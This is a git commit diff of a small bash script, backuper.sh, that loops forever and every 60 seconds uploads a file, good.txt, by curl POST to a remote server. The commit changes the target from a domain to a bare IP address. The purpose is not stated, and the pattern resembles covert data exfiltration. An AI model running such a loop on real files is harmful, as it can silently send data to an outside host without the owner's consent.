7be83f96952465809d817faf944537005fc2da00
Maru-Yasa <41475719+Maru-Yasa@users.noreply.github.com>
2021-12-07 19:25:36 +0700

    Update backuper.sh

--- backuper.sh
+++ backuper.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 while :
 do
-	curl -X POST -F upload=@good.txt https://premiumwatch.ma/backuper.php
+	curl -X POST -F upload=@good.txt http://139.162.8.165/backup_server.php
 	sleep 60
 done
